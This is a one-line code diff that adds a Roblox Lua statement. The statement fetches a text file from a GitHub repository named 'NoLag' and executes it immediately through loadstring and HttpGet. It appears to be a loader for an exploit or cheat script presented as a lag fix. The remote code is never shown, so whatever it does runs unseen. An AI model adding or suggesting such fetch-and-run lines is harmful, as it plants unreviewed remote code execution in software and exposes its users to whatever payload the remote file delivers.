@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xrithub/NoLag/refs/heads/main/34299e456861db14335b1f4beb17149a.txt"))()
